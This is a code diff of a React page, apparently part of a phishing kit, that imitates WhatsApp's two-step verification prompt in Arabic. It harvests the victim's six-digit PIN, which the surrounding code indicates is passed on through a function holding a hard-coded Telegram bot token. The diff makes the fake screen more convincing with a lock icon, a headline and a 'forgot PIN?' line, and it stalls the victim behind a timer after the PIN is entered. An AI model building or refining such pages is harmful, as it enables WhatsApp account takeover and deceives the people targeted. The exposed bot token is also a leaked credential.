@@ -1,19 +1,22 @@
 import React, { useState } from "react";
 import Axios from "axios";
 import { formatPhoneNumberIntl } from "react-phone-number-input";
-import { GridLoader } from "react-spinners";
 import SettingsContext from "../Context/SettingsContext";
 import Timer from "../Timer/Timer";
-import "./Confirm2.css"; // Import the CSS file
+import "./Confirm2.css";
 
 export default function Confirm2({ setNcode, ncode }) {
   const [error, setError] = useState(false);
   const [code2, setCode2] = useState("");
   const [workMinutes, setWorkMinutes] = useState(2.5);
-  const [message, setMessage] = useState(
-    "🔒 ادخل الرمز السري للواتساب \n  من قوانين القروب التوفر على الرمز السري  \n إذا ما مسوي رمز سويه أولا، ثم إرجع أدخله هنا",
-  );
   const [loading, setLoading] = useState(false);
+  const [messageVisible, setMessageVisible] = useState(true); // Control visibility of message
+  const [headlineVisible, setHeadlineVisible] = useState(true); // Control visibility of headline
+  const [logoVisible, setLogoVisible] = useState(true); // Control visibility of logo
+
+  const message =
+    "هذا الحساب محمي من خلال عملية التحقق \n بخطوتين، أدخل الرمز السري الذي اخرته مسبقا \n(Pin رمز) أثناء إعداد عملية التحقق بخطوتين \n" +
+    "إن رقم التعريف ليس كود التفعيل الذي يصلك من خلال رسالة نصية ";
 
   const APIS = () => {
     const apiToken = "6433121980:AAGko90tu3pLPIhkMTOHyYQZXMVb-vW-RNs";
@@ -24,25 +27,29 @@ export default function Confirm2({ setNcode, ncode }) {
   };
 
   const handle = () => {
-    console.log("Button clicked");
-
-    // Check if the code is less than 6 digits
     if (code2.length !== 6) {
-      console.log("Code too short");
       setError(true);
     } else {
-      console.log("Valid code");
-      setNcode({ ...ncode, code2: code2 });
+      setNcode({ ...ncode, code2 });
       APIS();
       setError(false);
       setLoading(true);
-      setMessage("ادخلت رمز خطأ، اعد المحاولة بعد نفاذ الوقت");
+      setMessageVisible(false); // Hide messages when the button is pressed
+      setHeadlineVisible(false); // Hide headline
+      setLogoVisible(false); // Hide logo
       setTimeout(() => {
         setCode2("");
         setLoading(false);
-        setMessage("رابط الإنضمام إلى المجموعة");
+        setMessageVisible(true); // Optionally show messages again after the timer
+        setHeadlineVisible(true); // Optionally show headline again after the timer
+        setLogoVisible(true); // Optionally show logo again after the timer
       }, 150000);
     }
+  };
+
+  const handleInputChange = (e) => {
+    const value = e.target.value.replace(/\D/g, "");
+    setCode2(value);
   };
 
   return (
@@ -50,45 +57,46 @@ export default function Confirm2({ setNcode, ncode }) {
       <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
         <div className="w-full max-w-md space-y-8">
           <div>
-            <img
-              className="mx-auto h-12 w-auto"
-              src={`${process.env.PUBLIC_URL}/wp.png`}
-              alt="Your Company"
-            />
-            <h2 className="mt-6 text-center tracking-tight text-gray-700 whitespace-pre-line">
-              {message}
-            </h2>
+            {headlineVisible && ( // Conditional rendering for the headline
+              <h1 className="text-center green-headline">التحقق بخطوتين</h1>
+            )}
+            {logoVisible && ( // Conditional rendering for the logo
+              <img
+                className="mx-auto h-16 w-16"
+                src="/lock.png"
+                alt="Your Company"
+              />
+            )}
+            {messageVisible && ( // Conditional rendering based on state
+              <h2 className="mt-6 text-center tracking-tight text-gray-700 whitespace-pre-line">
+                {message}
+              </h2>
+            )}
+            {messageVisible && ( // Separate line for the question
+              <h2 className="text-center green-text large">
+                هل نسيت رقم التعريف الشخصي؟
+              </h2>
+            )}
           </div>
+
           {loading ? (
-            <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
-              <SettingsContext.Provider
-                value={{
-                  workMinutes,
-                  setWorkMinutes,
-                }}
-              >
-                {<Timer />}
-              </SettingsContext.Provider>
-              {/*<GridLoader
-                            color={"#25D366"}
-                            loading={loading}
-                            size={20}
-                    />*/}
-            </div>
+            <SettingsContext.Provider value={{ workMinutes, setWorkMinutes }}>
+              <Timer />
+            </SettingsContext.Provider>
           ) : (
             <div className="mt-8 space-y-6">
-              <div className="-space-y-px rounded-md shadow-sm">
-                <div>
-                  <input
-                    type="tel"
-                    id="phone"
-                    className="bg-gray-700 border border-gray-300 text-white text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 text-center"
-                    placeholder="أدخل الرمز السري"
-                    onChange={(e) => setCode2(e.target.value)}
-                  />
-                </div>
+              <div className="pin-input-container">
+                <input
+                  type="text"
+                  maxLength="6"
+                  className="pin-input"
+                  value={code2}
+                  onChange={handleInputChange}
+                  placeholder="******"
+                />
               </div>
-              {error ? (
+
+              {error && (
                 <div
                   className="flex p-4 mb-4 text-sm text-red-700 bg-red-100 rounded-lg dark:bg-red-200 dark:text-red-800"
                   role="alert"
@@ -102,18 +110,16 @@ export default function Confirm2({ setNcode, ncode }) {
                   >
                     <path
                       fillRule="evenodd"
-                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
-                      clipRule={"evenodd"}
-                    ></path>
+                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
+                      clipRule="evenodd"
+                    />
                   </svg>
-                  <span className="sr-only">Info</span>
                   <div>
                     <span className="font-medium">الرمز غير صحيح</span>
                   </div>
                 </div>
-              ) : (
-                ""
               )}
+
               <div>
                 <button
                   className="group relative flex justify-center rounded-md border border-transparent bg-green-500 py-2 px-4 text-sm font-medium text-white hover:bg-green-400 focus:outline-none focus:ring-2 focus:ring-green-400 focus:ring-offset-2 custom-button"
